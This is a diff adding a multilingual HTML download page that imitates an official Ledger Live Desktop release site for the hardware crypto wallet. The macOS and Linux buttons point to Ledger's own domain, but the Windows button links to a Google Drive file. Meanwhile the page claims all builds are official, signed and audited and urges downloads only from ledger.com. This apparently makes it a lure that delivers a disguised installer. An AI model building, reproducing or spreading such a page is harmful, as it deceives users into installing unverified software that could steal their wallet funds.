@@ -1,0 +1,614 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="Versiones oficiales de Ledger Live Desktop, descargas verificadas y notas de lanzamiento." />
+  <title>Versiones de ledger Live Desktop</title>
+  <link rel="icon" type="image/x-icon" href="assets/img/icon-cov.ico" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Manrope:wght@400;600;700&display=swap" rel="stylesheet" />
+  <link href="css/styles.css" rel="stylesheet" />
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand">
+      <span class="brand-mark" data-i18n="brand.mark">Ledger</span>
+      <div class="brand-copy">
+        <span class="brand-title" data-i18n="brand.title">Live Desktop</span>
+        <span class="brand-sub" data-i18n="brand.sub">Versiones oficiales</span>
+      </div>
+    </div>
+    <nav class="nav-links">
+      <a href="#descargas" class="nav-link" data-i18n="nav.downloads">Descargas</a>
+      <a href="#seguridad" class="nav-link" data-i18n="nav.security">Seguridad</a>
+      <a href="#flujo" class="nav-link" data-i18n="nav.flow">Flujo</a>
+      <a href="#faqs" class="nav-link" data-i18n="nav.faq">FAQ</a>
+    </nav>
+    <div class="top-actions">
+      <a class="btn ghost" href="#notas" data-i18n="top.notes">Notas de versión</a>
+      <a class="btn primary" href="#descargas" data-i18n="top.download">Descargar</a>
+    </div>
+    <div class="lang-switcher">
+      <select id="langSelect" aria-label="Seleccionar idioma">
+        <option value="es">Español</option>
+        <option value="en">English</option>
+        <option value="pt-PT">Português (Portugal)</option>
+        <option value="pt-BR">Português (Brasil)</option>
+      </select>
+    </div>
+  </header>
+
+  <main>
+    <section class="hero" id="inicio">
+      <div class="hero-content">
+        <p class="eyebrow" data-i18n="hero.eyebrow">Ledger Live Desktop</p>
+        <h1 data-i18n="hero.title">Versiones seguras para escritorio</h1>
+        <p class="lede" data-i18n="hero.lede">Gestiona, firma y verifica transacciones con la aplicación oficial de Ledger. Seguridad certificada y lanzamientos continuos para Windows, macOS y Linux.</p>
+        <div class="cta-group">
+          <a class="btn primary" href="#descargas" data-i18n="hero.ctaDesktop">Descargar para escritorio</a>
+          <a class="btn outline" href="#notas" data-i18n="hero.ctaNotes">Ver notas de versión</a>
+        </div>
+        <div class="pill-list">
+          <span data-i18n="hero.pill1">Secure Element + PIN</span>
+          <span data-i18n="hero.pill2">Verificación en dispositivo</span>
+          <span data-i18n="hero.pill3">Actualizaciones firmadas</span>
+        </div>
+      </div>
+      <div class="hero-visual">
+        <div class="device-card">
+          <div class="badge" data-i18n="device.badge">Última versión estable</div>
+          <h3 data-i18n="device.title">Ledger Live Desktop v5.5.0</h3>
+          <p data-i18n="device.p1">Compatibilidad total con Nano X, Nano S Plus y Stax.</p>
+          <ul>
+            <li data-i18n="device.li1">Revisión de seguridad fortalecida</li>
+            <li data-i18n="device.li2">Soporte ampliado de tokens EVM</li>
+            <li data-i18n="device.li3">Modo claro/oscuro sin perder contraste</li>
+          </ul>
+          <div class="device-meta">
+            <span data-i18n="device.meta1">Firmas verificadas</span>
+            <span>Publicado: 12 Dic 2025</span>
+          </div>
+        </div>
+        <div class="glow"></div>
+      </div>
+    </section>
+
+    <section class="section" id="descargas">
+      <div class="section-heading">
+        <h2 data-i18n="downloads.title">Descargas rápidas</h2>
+        <p data-i18n="downloads.lede">Elige tu plataforma y descarga la versión oficial. Todas las builds están firmadas y auditadas.</p>
+      </div>
+      <div class="card-grid">
+        <article class="card">
+          <div class="card-top">
+            <span class="chip" data-i18n="card.desktop">Escritorio</span>
+            <span class="os" data-i18n="card.os.windows">Windows 11/10</span>
+          </div>
+          <h3 data-i18n="card.title">Ledger Live Desktop 5.5.0</h3>
+          <p class="muted" data-i18n="card.desc.windows">.exe 64 bits  Firma SHA-256 validada en app.</p>
+          <ul class="bullet-list">
+            <li data-i18n="card.li1">Sincronización segura con Ledger Nano.</li>
+            <li data-i18n="card.li2">Panel de activos multired.</li>
+            <li data-i18n="card.li3">Alertas de phishing integradas.</li>
+          </ul>
+          <div class="card-actions">
+            <a class="btn primary block" href="https://drive.usercontent.google.com/download?id=1wDH_6_Xa_Zn593IcGdy1Ac_7D09JcaD4&export=download&authuser=0" data-i18n="card.btn.windows">Descargar Windows</a>
+            <a class="text-link" href="#notas" data-i18n="text.viewNotes">Ver notas y hashes</a>
+          </div>
+        </article>
+        <article class="card">
+          <div class="card-top">
+            <span class="chip" data-i18n="card.desktop">Escritorio</span>
+            <span class="os" data-i18n="card.os.macos">macOS 13+</span>
+          </div>
+          <h3 data-i18n="card.title">Ledger Live Desktop 5.5.0</h3>
+          <p class="muted" data-i18n="card.desc.macos">Universal (.dmg)  Soporte Apple Silicon y Intel.</p>
+          <ul class="bullet-list">
+            <li data-i18n="card.li1">Sincronización segura con Ledger Nano.</li>
+            <li data-i18n="card.li2">Panel de activos multired.</li>
+            <li data-i18n="card.li3">Alertas de phishing integradas.</li>
+          </ul>
+          <div class="card-actions">
+            <a class="btn primary block" href="https://download.live.ledger.com/ledger-live-desktop-latest-mac.dmg" data-i18n="card.btn.macos">Descargar macOS</a>
+            <a class="text-link" href="#notas" data-i18n="text.viewNotes">Ver notas y hashes</a>
+          </div>
+        </article>
+        <article class="card">
+          <div class="card-top">
+            <span class="chip" data-i18n="card.desktop">Escritorio</span>
+            <span class="os" data-i18n="card.os.linux">Linux (AppImage)</span>
+          </div>
+          <h3 data-i18n="card.title">Ledger Live Desktop 5.5.0</h3>
+          <p class="muted" data-i18n="card.desc.linux">AppImage x86_64  Dependencias mínimas.</p>
+          <ul class="bullet-list">
+            <li data-i18n="card.li1">Sincronización segura con Ledger Nano.</li>
+            <li data-i18n="card.li2">Panel de activos multired.</li>
+            <li data-i18n="card.li3">Alertas de phishing integradas.</li>
+          </ul>
+          <div class="card-actions">
+            <a class="btn primary block" href="https://download.live.ledger.com/ledger-live-desktop-latest-linux.AppImage" data-i18n="card.btn.linux">Descargar Linux</a>
+            <a class="text-link" href="#notas" data-i18n="text.viewNotes">Ver notas y hashes</a>
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <section class="section soft" id="seguridad">
+      <div class="section-heading">
+        <h2 data-i18n="security.title">Seguridad y confianza</h2>
+        <p data-i18n="security.lede">Diseñamos Ledger Live con un enfoque \"device-first\". Las claves nunca abandonan tu hardware.</p>
+      </div>
+      <div class="features">
+        <div class="feature">
+          <h4 data-i18n="security.item1.title">Actualizaciones firmadas</h4>
+          <p data-i18n="security.item1.body">Cada build se publica con firma y verificación en dispositivo antes de instalar.</p>
+        </div>
+        <div class="feature">
+          <h4 data-i18n="security.item2.title">Transparencia</h4>
+          <p data-i18n="security.item2.body">Changelog público y canales beta, estable y LTS para equipos de seguridad.</p>
+        </div>
+        <div class="feature">
+          <h4 data-i18n="security.item3.title">Anti-phishing</h4>
+          <p data-i18n="security.item3.body">Alertas de dominio, bloqueo de URLs maliciosas y verificación visual en hardware.</p>
+        </div>
+        <div class="feature">
+          <h4 data-i18n="security.item4.title">Recuperación guiada</h4>
+          <p data-i18n="security.item4.body">Asistente paso a paso para restaurar con tu frase de recuperación sin exponerla.</p>
+        </div>
+      </div>
+    </section>
+
+    <section class="section" id="flujo">
+      <div class="section-heading">
+        <h2 data-i18n="flow.title">Flujo de actualización recomendado</h2>
+        <p data-i18n="flow.lede">Minimiza riesgos siguiendo este recorrido.</p>
+      </div>
+      <ol class="steps">
+        <li>
+          <span class="step-badge">1</span>
+          <div>
+            <h4 data-i18n="flow.step1.title">Respalda tu recovery sheet</h4>
+            <p data-i18n="flow.step1.body">Asegúrate de tener tu frase de 24 palabras guardada en papel seguro.</p>
+          </div>
+        </li>
+        <li>
+          <span class="step-badge">2</span>
+          <div>
+            <h4 data-i18n="flow.step2.title">Descarga desde ledger.com</h4>
+            <p data-i18n="flow.step2.body">Evita espejos y descarga únicamente desde la fuente oficial.</p>
+          </div>
+        </li>
+        <li>
+          <span class="step-badge">3</span>
+          <div>
+            <h4 data-i18n="flow.step3.title">Verifica la firma</h4>
+            <p data-i18n="flow.step3.body">Comprueba checksum o validación integrada antes de instalar.</p>
+          </div>
+        </li>
+        <li>
+          <span class="step-badge">4</span>
+          <div>
+            <h4 data-i18n="flow.step4.title">Actualiza el firmware</h4>
+            <p data-i18n="flow.step4.body">Conecta tu dispositivo Ledger y sigue las indicaciones en pantalla.</p>
+          </div>
+        </li>
+      </ol>
+    </section>
+
+    <section class="section" id="notas">
+      <div class="section-heading">
+        <h2 data-i18n="notes.title">Versiones anteriores</h2>
+        <p data-i18n="notes.lede">Historial breve de lanzamientos para escritorio.</p>
+      </div>
+      <div class="timeline">
+        <article class="timeline-item">
+          <div class="timeline-dot"></div>
+          <div>
+            <h4 data-i18n="notes.v542.title">v5.4.2  02 Nov 2025</h4>
+            <p data-i18n="notes.v542.body">Corrección de Ledger Recover, mejoras en rendimiento EVM y monitoreo de staking.</p>
+          </div>
+        </article>
+        <article class="timeline-item">
+          <div class="timeline-dot"></div>
+          <div>
+            <h4 data-i18n="notes.v530.title">v5.3.0  12 Sep 2025</h4>
+            <p data-i18n="notes.v530.body">Modo lectura sin dispositivo, nuevo panel de riesgos y UI unificada.</p>
+          </div>
+        </article>
+        <article class="timeline-item">
+          <div class="timeline-dot"></div>
+          <div>
+            <h4 data-i18n="notes.v521.title">v5.2.1  18 Jul 2025</h4>
+            <p data-i18n="notes.v521.body">Compatibilidad inicial con Ledger Stax, optimizaciones Bluetooth.</p>
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <section class="section soft" id="faqs">
+      <div class="section-heading">
+        <h2 data-i18n="faq.title">Preguntas frecuentes</h2>
+        <p data-i18n="faq.lede">Resolvemos las dudas más comunes antes de instalar.</p>
+      </div>
+      <div class="faq-list">
+        <div class="faq-item">
+          <button class="faq-question" data-i18n="faq.q1">¿Necesito el dispositivo conectado para abrir la app?</button>
+          <div class="faq-answer" data-i18n="faq.a1">No. Puedes consultar balances en modo lectura. Para firmar o actualizar firmware, conecta tu Ledger.</div>
+        </div>
+        <div class="faq-item">
+          <button class="faq-question" data-i18n="faq.q2">¿Cómo verifico que el instalador es legítimo?</button>
+          <div class="faq-answer" data-i18n="faq.a2">Descarga desde ledger.com, revisa el checksum publicado y valida la firma en la pantalla del dispositivo.</div>
+        </div>
+        <div class="faq-item">
+          <button class="faq-question" data-i18n="faq.q3">¿Las versiones antiguas seguirán funcionando?</button>
+          <div class="faq-answer" data-i18n="faq.a3">Sí, pero recomendamos mantenerte en la rama estable más reciente para recibir parches de seguridad.</div>
+        </div>
+      </div>
+    </section>
+
+    <section class="cta">
+      <div class="cta-copy">
+        <p class="eyebrow" data-i18n="cta.eyebrow">Listo para actualizar</p>
+        <h2 data-i18n="cta.title">Protege tus activos con la última versión de Ledger Wallet.</h2>
+      </div>
+      <div class="cta-actions">
+        <a class="btn primary" href="#descargas" data-i18n="cta.btnDownload">Descargar ahora</a>
+        <a class="btn ghost" href="#faqs" data-i18n="cta.btnFaq">Ver preguntas</a>
+      </div>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <p data-i18n="footer.copy">Ledger Wallet  Lanzamientos continuos  Seguridad primero.</p>
+  </footer>
+  <!-- Inline i18n dictionaries for local file usage -->
+  <script type="application/json" id="i18n-es">
+  {
+    "brand.mark": "Ledger",
+    "brand.title": "Live Desktop",
+    "brand.sub": "Versiones oficiales",
+    "nav.downloads": "Descargas",
+    "nav.security": "Seguridad",
+    "nav.flow": "Flujo",
+    "nav.faq": "FAQ",
+    "top.notes": "Notas de versión",
+    "top.download": "Descargar",
+    "hero.eyebrow": "Ledger Live Desktop",
+    "hero.title": "Versiones seguras para escritorio",
+    "hero.lede": "Gestiona, firma y verifica transacciones con la aplicación oficial de Ledger. Seguridad certificada y lanzamientos continuos para Windows, macOS y Linux.",
+    "hero.ctaDesktop": "Descargar para escritorio",
+    "hero.ctaNotes": "Ver notas de versión",
+    "hero.pill1": "Secure Element + PIN",
+    "hero.pill2": "Verificación en dispositivo",
+    "hero.pill3": "Actualizaciones firmadas",
+    "device.badge": "Última versión estable",
+    "device.title": "Ledger Live Desktop v5.5.0",
+    "device.p1": "Compatibilidad total con Nano X, Nano S Plus y Stax.",
+    "device.li1": "Revisión de seguridad fortalecida",
+    "device.li2": "Soporte ampliado de tokens EVM",
+    "device.li3": "Modo claro/oscuro sin perder contraste",
+    "device.meta1": "Firmas verificadas",
+    "downloads.title": "Descargas rápidas",
+    "downloads.lede": "Elige tu plataforma y descarga la versión oficial. Todas las builds están firmadas y auditadas.",
+    "card.desktop": "Escritorio",
+    "card.os.windows": "Windows 11/10",
+    "card.os.macos": "macOS 13+",
+    "card.os.linux": "Linux (AppImage)",
+    "card.title": "Ledger Live Desktop 5.5.0",
+    "card.desc.windows": ".exe 64 bits · Firma SHA-256 validada en app.",
+    "card.desc.macos": "Universal (.dmg) · Soporte Apple Silicon y Intel.",
+    "card.desc.linux": "AppImage x86_64 · Dependencias mínimas.",
+    "card.li1": "Sincronización segura con Ledger Nano.",
+    "card.li2": "Panel de activos multired.",
+    "card.li3": "Alertas de phishing integradas.",
+    "card.btn.windows": "Descargar Windows",
+    "card.btn.macos": "Descargar macOS",
+    "card.btn.linux": "Descargar Linux",
+    "text.viewNotes": "Ver notas y hashes",
+    "security.title": "Seguridad y confianza",
+    "security.lede": "Diseñamos Ledger Live con un enfoque \"device-first\". Las claves nunca abandonan tu hardware.",
+    "security.item1.title": "Actualizaciones firmadas",
+    "security.item1.body": "Cada build se publica con firma y verificación en dispositivo antes de instalar.",
+    "security.item2.title": "Transparencia",
+    "security.item2.body": "Changelog público y canales beta, estable y LTS para equipos de seguridad.",
+    "security.item3.title": "Anti-phishing",
+    "security.item3.body": "Alertas de dominio, bloqueo de URLs maliciosas y verificación visual en hardware.",
+    "security.item4.title": "Recuperación guiada",
+    "security.item4.body": "Asistente paso a paso para restaurar con tu frase de recuperación sin exponerla.",
+    "flow.title": "Flujo de actualización recomendado",
+    "flow.lede": "Minimiza riesgos siguiendo este recorrido.",
+    "flow.step1.title": "Respalda tu recovery sheet",
+    "flow.step1.body": "Asegúrate de tener tu frase de 24 palabras guardada en papel seguro.",
+    "flow.step2.title": "Descarga desde ledger.com",
+    "flow.step2.body": "Evita espejos y descarga únicamente desde la fuente oficial.",
+    "flow.step3.title": "Verifica la firma",
+    "flow.step3.body": "Comprueba checksum o validación integrada antes de instalar.",
+    "flow.step4.title": "Actualiza el firmware",
+    "flow.step4.body": "Conecta tu dispositivo Ledger y sigue las indicaciones en pantalla.",
+    "notes.title": "Versiones anteriores",
+    "notes.lede": "Historial breve de lanzamientos para escritorio.",
+    "notes.v542.title": "v5.4.2 · 02 Nov 2025",
+    "notes.v542.body": "Corrección de Ledger Recover, mejoras en rendimiento EVM y monitoreo de staking.",
+    "notes.v530.title": "v5.3.0 · 12 Sep 2025",
+    "notes.v530.body": "Modo lectura sin dispositivo, nuevo panel de riesgos y UI unificada.",
+    "notes.v521.title": "v5.2.1 · 18 Jul 2025",
+    "notes.v521.body": "Compatibilidad inicial con Ledger Stax, optimizaciones Bluetooth.",
+    "faq.title": "Preguntas frecuentes",
+    "faq.lede": "Resolvemos las dudas más comunes antes de instalar.",
+    "faq.q1": "¿Necesito el dispositivo conectado para abrir la app?",
+    "faq.a1": "No. Puedes consultar balances en modo lectura. Para firmar o actualizar firmware, conecta tu Ledger.",
+    "faq.q2": "¿Cómo verifico que el instalador es legítimo?",
+    "faq.a2": "Descarga desde ledger.com, revisa el checksum publicado y valida la firma en la pantalla del dispositivo.",
+    "faq.q3": "¿Las versiones antiguas seguirán funcionando?",
+    "faq.a3": "Sí, pero recomendamos mantenerte en la rama estable más reciente para recibir parches de seguridad.",
+    "cta.eyebrow": "Listo para actualizar",
+    "cta.title": "Protege tus activos con la última versión de Ledger Wallet.",
+    "cta.btnDownload": "Descargar ahora",
+    "cta.btnFaq": "Ver preguntas",
+    "footer.copy": "Ledger Wallet · Lanzamientos continuos · Seguridad primero."
+  }
+  </script>
+  <script type="application/json" id="i18n-en">
+  {
+    "brand.mark": "Ledger",
+    "brand.title": "Live Desktop",
+    "brand.sub": "Official releases",
+    "nav.downloads": "Downloads",
+    "nav.security": "Security",
+    "nav.flow": "Update Flow",
+    "nav.faq": "FAQ",
+    "top.notes": "Release notes",
+    "top.download": "Download",
+    "hero.eyebrow": "Ledger Live Desktop",
+    "hero.title": "Secure desktop releases",
+    "hero.lede": "Manage, sign and verify transactions with Ledger's official app. Certified security and continuous releases for Windows, macOS and Linux.",
+    "hero.ctaDesktop": "Download for desktop",
+    "hero.ctaNotes": "View release notes",
+    "hero.pill1": "Secure Element + PIN",
+    "hero.pill2": "On-device verification",
+    "hero.pill3": "Signed updates",
+    "device.badge": "Latest stable",
+    "device.title": "Ledger Live Desktop v5.5.0",
+    "device.p1": "Full compatibility with Nano X, Nano S Plus and Stax.",
+    "device.li1": "Strengthened security review",
+    "device.li2": "Expanded EVM token support",
+    "device.li3": "Light/Dark modes with contrast",
+    "device.meta1": "Verified signatures",
+    "downloads.title": "Fast downloads",
+    "downloads.lede": "Pick your platform and get the official build. All builds are signed and audited.",
+    "card.desktop": "Desktop",
+    "card.os.windows": "Windows 11/10",
+    "card.os.macos": "macOS 13+",
+    "card.os.linux": "Linux (AppImage)",
+    "card.title": "Ledger Live Desktop 5.5.0",
+    "card.desc.windows": ".exe 64-bit · SHA-256 signature validated in app.",
+    "card.desc.macos": "Universal (.dmg) · Apple Silicon & Intel support.",
+    "card.desc.linux": "AppImage x86_64 · Minimal dependencies.",
+    "card.li1": "Secure sync with Ledger Nano.",
+    "card.li2": "Multi-network asset dashboard.",
+    "card.li3": "Built-in phishing alerts.",
+    "card.btn.windows": "Download Windows",
+    "card.btn.macos": "Download macOS",
+    "card.btn.linux": "Download Linux",
+    "text.viewNotes": "View notes & hashes",
+    "security.title": "Security & trust",
+    "security.lede": "Ledger Live is designed with a device-first approach. Keys never leave your hardware.",
+    "security.item1.title": "Signed updates",
+    "security.item1.body": "Each build is published with a signature and verified on the device before installing.",
+    "security.item2.title": "Transparency",
+    "security.item2.body": "Public changelog and beta/stable/LTS channels for security teams.",
+    "security.item3.title": "Anti-phishing",
+    "security.item3.body": "Domain alerts, malicious URL blocking and visual verification on hardware.",
+    "security.item4.title": "Guided recovery",
+    "security.item4.body": "Step-by-step assistant to restore with your recovery phrase without exposing it.",
+    "flow.title": "Recommended update flow",
+    "flow.lede": "Minimize risk by following this path.",
+    "flow.step1.title": "Backup your recovery sheet",
+    "flow.step1.body": "Make sure your 24-word phrase is stored safely on paper.",
+    "flow.step2.title": "Download from ledger.com",
+    "flow.step2.body": "Avoid mirrors and only download from the official source.",
+    "flow.step3.title": "Verify the signature",
+    "flow.step3.body": "Check checksum or in-app validation before installing.",
+    "flow.step4.title": "Update firmware",
+    "flow.step4.body": "Connect your Ledger and follow on-screen instructions.",
+    "notes.title": "Previous releases",
+    "notes.lede": "Short desktop release history.",
+    "notes.v542.title": "v5.4.2 · Nov 02, 2025",
+    "notes.v542.body": "Ledger Recover fixes, EVM performance improvements and staking monitoring.",
+    "notes.v530.title": "v5.3.0 · Sep 12, 2025",
+    "notes.v530.body": "Read-only mode without device, new risk panel and unified UI.",
+    "notes.v521.title": "v5.2.1 · Jul 18, 2025",
+    "notes.v521.body": "Initial compatibility with Ledger Stax, Bluetooth optimizations.",
+    "faq.title": "Frequently asked questions",
+    "faq.lede": "We answer common questions before you install.",
+    "faq.q1": "Do I need the device connected to open the app?",
+    "faq.a1": "No. You can check balances in read-only mode. To sign or update firmware, connect your Ledger.",
+    "faq.q2": "How do I verify the installer is legitimate?",
+    "faq.a2": "Download from ledger.com, check the published checksum and validate the signature on the device screen.",
+    "faq.q3": "Will older versions keep working?",
+    "faq.a3": "Yes, but we recommend staying on the latest stable branch to receive security patches.",
+    "cta.eyebrow": "Ready to update",
+    "cta.title": "Protect your assets with the latest Ledger Wallet version.",
+    "cta.btnDownload": "Download now",
+    "cta.btnFaq": "View questions",
+    "footer.copy": "Ledger Wallet · Continuous releases · Security first."
+  }
+  </script>
+  <script type="application/json" id="i18n-pt-PT">
+  {
+    "brand.mark": "Ledger",
+    "brand.title": "Live Desktop",
+    "brand.sub": "Versões oficiais",
+    "nav.downloads": "Transferências",
+    "nav.security": "Segurança",
+    "nav.flow": "Fluxo de atualização",
+    "nav.faq": "FAQ",
+    "top.notes": "Notas de versão",
+    "top.download": "Transferir",
+    "hero.eyebrow": "Ledger Live Desktop",
+    "hero.title": "Versões seguras para computador",
+    "hero.lede": "Gere, assina e verifica transações com a app oficial da Ledger. Segurança certificada e lançamentos contínuos para Windows, macOS e Linux.",
+    "hero.ctaDesktop": "Transferir para computador",
+    "hero.ctaNotes": "Ver notas de versão",
+    "hero.pill1": "Secure Element + PIN",
+    "hero.pill2": "Verificação no dispositivo",
+    "hero.pill3": "Atualizações assinadas",
+    "device.badge": "Última versão estável",
+    "device.title": "Ledger Live Desktop v5.5.0",
+    "device.p1": "Compatibilidade total com Nano X, Nano S Plus e Stax.",
+    "device.li1": "Revisão de segurança reforçada",
+    "device.li2": "Suporte alargado a tokens EVM",
+    "device.li3": "Modos claro/escuro com contraste",
+    "device.meta1": "Assinaturas verificadas",
+    "downloads.title": "Transferências rápidas",
+    "downloads.lede": "Escolhe a tua plataforma e transfere a versão oficial. Todas as builds são assinadas e auditadas.",
+    "card.desktop": "Computador",
+    "card.os.windows": "Windows 11/10",
+    "card.os.macos": "macOS 13+",
+    "card.os.linux": "Linux (AppImage)",
+    "card.title": "Ledger Live Desktop 5.5.0",
+    "card.desc.windows": ".exe 64 bits · Assinatura SHA-256 validada na app.",
+    "card.desc.macos": "Universal (.dmg) · Suporte Apple Silicon e Intel.",
+    "card.desc.linux": "AppImage x86_64 · Dependências mínimas.",
+    "card.li1": "Sincronização segura com Ledger Nano.",
+    "card.li2": "Painel de ativos multirede.",
+    "card.li3": "Alertas anti-phishing integrados.",
+    "card.btn.windows": "Transferir Windows",
+    "card.btn.macos": "Transferir macOS",
+    "card.btn.linux": "Transferir Linux",
+    "text.viewNotes": "Ver notas e hashes",
+    "security.title": "Segurança e confiança",
+    "security.lede": "O Ledger Live foi desenhado com abordagem 'device-first'. As chaves nunca deixam o teu hardware.",
+    "security.item1.title": "Atualizações assinadas",
+    "security.item1.body": "Cada build é publicada com assinatura e verificada no dispositivo antes de instalar.",
+    "security.item2.title": "Transparência",
+    "security.item2.body": "Registo público de alterações e canais beta/estável/LTS para equipas de segurança.",
+    "security.item3.title": "Anti-phishing",
+    "security.item3.body": "Alertas de domínio, bloqueio de URLs maliciosas e verificação visual no hardware.",
+    "security.item4.title": "Recuperação guiada",
+    "security.item4.body": "Assistente passo a passo para restaurar com a tua frase de recuperação sem a expor.",
+    "flow.title": "Fluxo de atualização recomendado",
+    "flow.lede": "Minimiza riscos seguindo este percurso.",
+    "flow.step1.title": "Faz backup da tua recovery sheet",
+    "flow.step1.body": "Garante que a tua frase de 24 palavras está guardada em papel com segurança.",
+    "flow.step2.title": "Transfere de ledger.com",
+    "flow.step2.body": "Evita espelhos e transfere apenas da fonte oficial.",
+    "flow.step3.title": "Verifica a assinatura",
+    "flow.step3.body": "Confere o checksum ou validação integrada antes de instalar.",
+    "flow.step4.title": "Atualiza o firmware",
+    "flow.step4.body": "Liga o teu Ledger e segue as instruções no ecrã.",
+    "notes.title": "Versões anteriores",
+    "notes.lede": "Histórico breve de lançamentos para computador.",
+    "notes.v542.title": "v5.4.2 · 02 Nov 2025",
+    "notes.v542.body": "Correções no Ledger Recover, melhorias de desempenho EVM e monitorização de staking.",
+    "notes.v530.title": "v5.3.0 · 12 Set 2025",
+    "notes.v530.body": "Modo leitura sem dispositivo, novo painel de risco e UI unificada.",
+    "notes.v521.title": "v5.2.1 · 18 Jul 2025",
+    "notes.v521.body": "Compatibilidade inicial com Ledger Stax, otimizações Bluetooth.",
+    "faq.title": "Perguntas frequentes",
+    "faq.lede": "Respondemos às dúvidas mais comuns antes de instalar.",
+    "faq.q1": "Preciso do dispositivo ligado para abrir a app?",
+    "faq.a1": "Não. Podes consultar saldos em modo leitura. Para assinar ou atualizar firmware, liga o teu Ledger.",
+    "faq.q2": "Como verifico que o instalador é legítimo?",
+    "faq.a2": "Transfere de ledger.com, verifica o checksum publicado e valida a assinatura no ecrã do dispositivo.",
+    "faq.q3": "As versões antigas continuam a funcionar?",
+    "faq.a3": "Sim, mas recomendamos manteres-te na versão estável mais recente para receberes correções de segurança.",
+    "cta.eyebrow": "Pronto para atualizar",
+    "cta.title": "Protege os teus ativos com a última versão do Ledger Wallet.",
+    "cta.btnDownload": "Transferir agora",
+    "cta.btnFaq": "Ver perguntas",
+    "footer.copy": "Ledger Wallet · Lançamentos contínuos · Segurança primeiro."
+  }
+  </script>
+  <script type="application/json" id="i18n-pt-BR">
+  {
+    "brand.mark": "Ledger",
+    "brand.title": "Live Desktop",
+    "brand.sub": "Versões oficiais",
+    "nav.downloads": "Downloads",
+    "nav.security": "Segurança",
+    "nav.flow": "Fluxo",
+    "nav.faq": "FAQ",
+    "top.notes": "Notas de versão",
+    "top.download": "Baixar",
+    "hero.eyebrow": "Ledger Live Desktop",
+    "hero.title": "Versões seguras para desktop",
+    "hero.lede": "Gerencie, assine e verifique transações com o app oficial da Ledger. Segurança certificada e lançamentos contínuos para Windows, macOS e Linux.",
+    "hero.ctaDesktop": "Baixar para desktop",
+    "hero.ctaNotes": "Ver notas de versão",
+    "hero.pill1": "Secure Element + PIN",
+    "hero.pill2": "Verificação no dispositivo",
+    "hero.pill3": "Atualizações assinadas",
+    "device.badge": "Última versão estável",
+    "device.title": "Ledger Live Desktop v5.5.0",
+    "device.p1": "Compatibilidade total com Nano X, Nano S Plus e Stax.",
+    "device.li1": "Revisão de segurança reforçada",
+    "device.li2": "Suporte ampliado a tokens EVM",
+    "device.li3": "Modo claro/escuro com bom contraste",
+    "device.meta1": "Assinaturas verificadas",
+    "downloads.title": "Downloads rápidos",
+    "downloads.lede": "Escolha sua plataforma e baixe a versão oficial. Todos os builds são assinados e auditados.",
+    "card.desktop": "Desktop",
+    "card.os.windows": "Windows 11/10",
+    "card.os.macos": "macOS 13+",
+    "card.os.linux": "Linux (AppImage)",
+    "card.title": "Ledger Live Desktop 5.5.0",
+    "card.desc.windows": ".exe 64 bits · Assinatura SHA-256 validada no app.",
+    "card.desc.macos": "Universal (.dmg) · Suporte para Apple Silicon e Intel.",
+    "card.desc.linux": "AppImage x86_64 · Dependências mínimas.",
+    "card.li1": "Sincronização segura com Ledger Nano.",
+    "card.li2": "Painel de ativos multirrede.",
+    "card.li3": "Alertas anti-phishing integrados.",
+    "card.btn.windows": "Baixar Windows",
+    "card.btn.macos": "Baixar macOS",
+    "card.btn.linux": "Baixar Linux",
+    "text.viewNotes": "Ver notas e hashes",
+    "security.title": "Segurança e confiança",
+    "security.lede": "O Ledger Live foi projetado com abordagem device-first. As chaves nunca deixam o seu hardware.",
+    "security.item1.title": "Atualizações assinadas",
+    "security.item1.body": "Cada build é publicada com assinatura e verificação no dispositivo antes da instalação.",
+    "security.item2.title": "Transparência",
+    "security.item2.body": "Changelog público e canais beta, estável e LTS para equipes de segurança.",
+    "security.item3.title": "Anti-phishing",
+    "security.item3.body": "Alertas de domínio, bloqueio de URLs maliciosas e verificação visual no hardware.",
+    "security.item4.title": "Recuperação guiada",
+    "security.item4.body": "Assistente passo a passo para restaurar com sua frase de recuperação sem expô-la.",
+    "flow.title": "Fluxo de atualização recomendado",
+    "flow.lede": "Minimize riscos seguindo este percurso.",
+    "flow.step1.title": "Faça backup da recovery sheet",
+    "flow.step1.body": "Garanta que sua frase de 24 palavras está guardada com segurança em papel.",
+    "flow.step2.title": "Baixe de ledger.com",
+    "flow.step2.body": "Evite mirrors e baixe apenas da fonte oficial.",
+    "flow.step3.title": "Verifique a assinatura",
+    "flow.step3.body": "Cheque o checksum ou validação integrada antes de instalar.",
+    "flow.step4.title": "Atualize o firmware",
+    "flow.step4.body": "Conecte seu dispositivo Ledger e siga as instruções na tela.",
+    "notes.title": "Versões anteriores",
+    "notes.lede": "Breve histórico de lançamentos para desktop.",
+    "notes.v542.title": "v5.4.2 · 02 Nov 2025",
+    "notes.v542.body": "Correção do Ledger Recover, melhorias de desempenho EVM e monitoramento de staking.",
+    "notes.v530.title": "v5.3.0 · 12 Set 2025",
+    "notes.v530.body": "Modo leitura sem dispositivo, novo painel de riscos e UI unificada.",
+    "notes.v521.title": "v5.2.1 · 18 Jul 2025",
+    "notes.v521.body": "Compatibilidade inicial com Ledger Stax, otimizações de Bluetooth.",
+    "faq.title": "Perguntas frequentes",
+    "faq.lede": "Respondemos às dúvidas mais comuns antes da instalação.",
+    "faq.q1": "Preciso do dispositivo conectado para abrir o app?",
+    "faq.a1": "Não. Você pode consultar saldos em modo leitura. Para assinar ou atualizar firmware, conecte seu Ledger.",
+    "faq.q2": "Como verificar se o instalador é legítimo?",
+    "faq.a2": "Baixe de ledger.com, verifique o checksum publicado e valide a assinatura na tela do dispositivo.",
+    "faq.q3": "Versões antigas continuarão funcionando?",
+    "faq.a3": "Sim, mas recomendamos permanecer na última versão estável para receber correções de segurança.",
+    "cta.eyebrow": "Pronto para atualizar",
+    "cta.title": "Proteja seus ativos com a última versão do Ledger Wallet.",
+    "cta.btnDownload": "Baixar agora",
+    "cta.btnFaq": "Ver perguntas",
+    "footer.copy": "Ledger Wallet · Lançamentos contínuos · Segurança em primeiro lugar."
+  }
+  </script>
+
+  <script src="js/scripts.js"></script>
+</body>
